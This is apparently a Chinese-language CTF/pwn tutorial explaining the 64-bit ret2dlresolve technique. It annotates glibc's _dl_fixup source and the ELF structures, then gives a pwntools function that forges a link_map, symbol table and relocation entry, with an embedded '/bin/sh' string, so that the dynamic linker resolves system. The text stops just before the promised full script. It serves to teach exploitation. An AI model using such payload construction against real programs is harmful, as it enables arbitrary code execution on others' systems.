
```c
\_dl\_fixup (struct link\_map \*l, ElfW(Word) reloc\_arg) // 第一个参数link\_map，也就是got[1]
{
// 获取link\_map中存放DT\_SYMTAB的地址
const ElfW(Sym) \*const symtab = (const void \*) D\_PTR (l, l\_info[DT\_SYMTAB]);
// 获取link\_map中存放DT\_STRTAB的地址
const char \*strtab = (const void \*) D\_PTR (l, l\_info[DT\_STRTAB]);
// reloc\_offset就是reloc\_arg,获取重定位表项中对应函数的结构体
const PLTREL \*const reloc = (const void \*) (D\_PTR (l, l\_info[DT\_JMPREL]) + reloc\_offset);
// 根据重定位结构体的r\_info得到symtab表中对应的结构体
const ElfW(Sym) \*sym = &symtab[ELFW(R\_SYM) (reloc->r\_info)];
void \*const rel\_addr = (void \*)(l->l\_addr + reloc->r\_offset);
lookup\_t result;
DL\_FIXUP\_VALUE\_TYPE value;
/\* Sanity check that we're really looking at a PLT relocation. \*/
assert (ELFW(R\_TYPE)(reloc->r\_info) == ELF\_MACHINE\_JMP\_SLOT); // 检查r\_info的最低位是不是7
/\* Look up the target symbol. If the normal lookup rules are not
used don't look in the global scope. \*/
if (\_\_builtin\_expect (ELFW(ST\_VISIBILITY) (sym->st\_other), 0) == 0) // 这里是一层检测，检查sym结构体中的st\_other是否为0，正常情况下为0，执行下面代码
{
const struct r\_found\_version \*version = NULL;
// 这里也是一层检测，检查link\_map中的DT\_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
if (l->l\_info[VERSYMIDX (DT\_VERSYM)] != NULL)
{
// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R\_SYM) (reloc->r\_info)] & 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc->r\_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link\_map中的DT\_VERSYM为NULL，那我们就要泄露出link\_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st\_other不为0，直接跳到后面的else语句执行。
const ElfW(Half) \*vernum = (const void \*) D\_PTR (l, l\_info[VERSYMIDX (DT\_VERSYM)]);
ElfW(Half) ndx = vernum[ELFW(R\_SYM) (reloc->r\_info)] & 0x7fff;
version = &l->l\_versions[ndx];
if (version->hash == 0)
version = NULL;
}
/\* We need to keep the scope around so do some locking. This is
not necessary for objects which cannot be unloaded or when
we are not using any threads (yet). \*/
int flags = DL\_LOOKUP\_ADD\_DEPENDENCY;
if (!RTLD\_SINGLE\_THREAD\_P)
{
THREAD\_GSCOPE\_SET\_FLAG ();
flags |= DL\_LOOKUP\_GSCOPE\_LOCK;
}
RTLD\_ENABLE\_FOREIGN\_CALL;
// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym->st\_name找到符号表字符串，result为libc基地址
result = \_dl\_lookup\_symbol\_x (strtab + sym->st\_name, l, &sym, l->l\_scope,
version, ELF\_RTYPE\_CLASS\_PLT, flags, NULL);
/\* We are done with the global scope. \*/
if (!RTLD\_SINGLE\_THREAD\_P)
THREAD\_GSCOPE\_RESET\_FLAG ();
RTLD\_FINALIZE\_FOREIGN\_CALL;
/\* Currently result contains the base load address (or link map)
of the object that defines sym. Now add in the symbol
offset. \*/
// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st\_value
value = DL\_FIXUP\_MAKE\_VALUE (result, sym ? (LOOKUP\_VALUE\_ADDRESS (result) + sym->st\_value) : 0);
}
else
{
// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l->l\_addr + st\_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l\_addr 和 st\_value
/\* We already found the symbol. The module (and therefore its load
address) is also known. \*/
value = DL\_FIXUP\_MAKE\_VALUE (l, l->l\_addr + sym->st\_value);
result = l;
}
/\* And now perhaps the relocation addend. \*/
value = elf\_machine\_plt\_value (l, reloc, value);
if (sym != NULL
&& \_\_builtin\_expect (ELFW(ST\_TYPE) (sym->st\_info) == STT\_GNU\_IFUNC, 0))
value = elf\_ifunc\_invoke (DL\_FIXUP\_VALUE\_ADDR (value));
/\* Finally, fix up the plt itself. \*/
if (\_\_glibc\_unlikely (GLRO(dl\_bind\_not)))
return value;
// 最后把value写入相应的GOT表条目中
return elf\_machine\_fixup\_plt (l, result, reloc, rel\_addr, value);
}
```

所以接下来我们的任务就是控制 `link_map` 中的 `l_addr` 和 `sym` 中的 `st_value`

具体思路为

- 伪造 `link_map->l_addr` 为 libc 中已解析函数与想要执行的目标函数的偏移值，如 `addr_system-addr_xxx`

- 伪造 `sym->st_value` 为已经解析过的某个函数的 got 表的位置

- 也就是相当于 `value = l_addr + st_value = addr_system - addr_xxx + real_xxx = real_system`

下面是64位下的sym结构体

```c
typedef struct
{
Elf64\_Word st\_name; /\* Symbol name (string tbl index) \*/
unsigned char st\_info; /\* Symbol type and binding \*/
unsigned char st\_other; /\* Symbol visibility \*/
Elf64\_Section st\_shndx; /\* Section index \*/
Elf64\_Addr st\_value; /\* Symbol value \*/
Elf64\_Xword st\_size; /\* Symbol size \*/
} Elf64\_Sym;
```

其中

- `Elf64_Word` 32 位

- `Elf64_Section` 16 位

- `Elf64_Addr` 64 位

- `Elf64_Xword` 64 位

所以sym结构体的大小为24字节，st\_value就位于sym[num]首地址+0x8的位置（ 4 + 1 + 1 + 2）

我们自然就可以想到，如果，我们把一个函数的got表地址-0x8的位置当作sym表首地址，那么它的st\_value的值就是这个函数的got表上的值，也就是实际地址，此时它的st\_other恰好不为0

再来看link\_map的结构

```c
struct link_map {
Elf64_Addr l_addr;
char *l_name;
Elf64_Dyn *l_ld;
struct link_map *l_next;
struct link_map *l_prev;
struct link_map *l_real;
Lmid_t l_ns;
struct libname_list *l_libname;
Elf64_Dyn *l_info[76]; //l_info 里面包含的就是动态链接的各个表的信息
...
size_t l_tls_firstbyte_offset;
ptrdiff_t l_tls_offset;
size_t l_tls_modid;
size_t l_tls_dtor_count;
Elf64_Addr l_relro_addr;
size_t l_relro_size;
unsigned long long l_serial;
struct auditstate l_audit[];
}
```

这里的.dynamic节就对应l\_info的内容

![image-20210310011345625](upload/attach/202104/921840\_9CS92EZC2PWB3VF.jpg)

所以如果我们伪造一个link\_map表，很容易就可以控制 `l_addr` ，通过阅读源码，我们知道`_dl_fixup`主要用了 `l_info` 的内容 ，也就是其中JMPREL,STRTAB,SYMTAB的地址。

所以我们需要伪造这个数组里的几个指针

+ DT\_STRTAB指针：位于`link_map_addr +0x68`(32位下是0x34)

+ DT\_SYMTAB指针：位于`link_map_addr + 0x70`(32位下是0x38)

+ DT\_JMPREL指针：位于`link_map_addr +0xF8`(32位下是0x7C)

然后伪造三个elf64\_dyn即可，dynstr只需要指向一个可读的地方，因为这里我们没有用到

64位下重定位表项与32位有所不同

```c
typedef struct
{
Elf64_Addr r_offset; /\* Address \*/
Elf64_Xword r_info; /\* Relocation type and symbol index \*/
Elf64_Sxword r_addend; /\* Addend \*/
} Elf64_Rela;
/\* How to extract and insert information held in the r_info field. \*/
#define ELF64_R_SYM(i) ((i) >> 32)
#define ELF64_R_TYPE(i) ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) << 32) + (type))
```

这里 `Elf64_Addr`、`Elf64_Xword`、`Elf64_Sxword` 都为 64 位，因此 `Elf64_Rela` 结构体的大小为 24 （0x18）字节。

![image-20210309200557598](upload/attach/202104/921840\_Q6YK9KE5V7N4HG6.jpg)

在这里可以看到，write 函数在符号表中的偏移为 1（0x100000007h>>32）

除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0，对应上图第一个位置

![image-20210310003453921](upload/attach/202104/921840\_DZJ6R6PGADNXDQ2.jpg)

接下来我们伪造link\_map，know\_func\_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移，由于我们只需要在link\_map特定的几个位置伪造指针，而中间的内容不会用到，所以我们就把伪造的rel.plt,symtab放在中间，方便理解可从下往上读代码。

```python
def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
# &(2**64-1)是因为offset通常为负数，如果不控制范围，p64后会越界，发生错误
linkmap = p64(offset & (2 ** 64 - 1))#l_addr
# fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容
linkmap += p64(0) # 可以为任意值
linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址
# fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)) # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可
linkmap += p64(0x7) # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
linkmap += p64(0)# Rela->r_addend,任意值都行
linkmap += p64(0)#l_ns
# fake_linkmap_addr + 0x38, DT_SYMTAB
linkmap += p64(0) # 参考IDA上.dyamisc的结构
linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8
linkmap += b'/bin/sh\x00'
linkmap = linkmap.ljust(0x68,b'A')
linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRtab的地址，由于我们用不到strtab，所以随意设置了一个可读区域
linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
linkmap = linkmap.ljust(0xf8,b'A')
linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
return linkmap
```

下面是完整的脚本
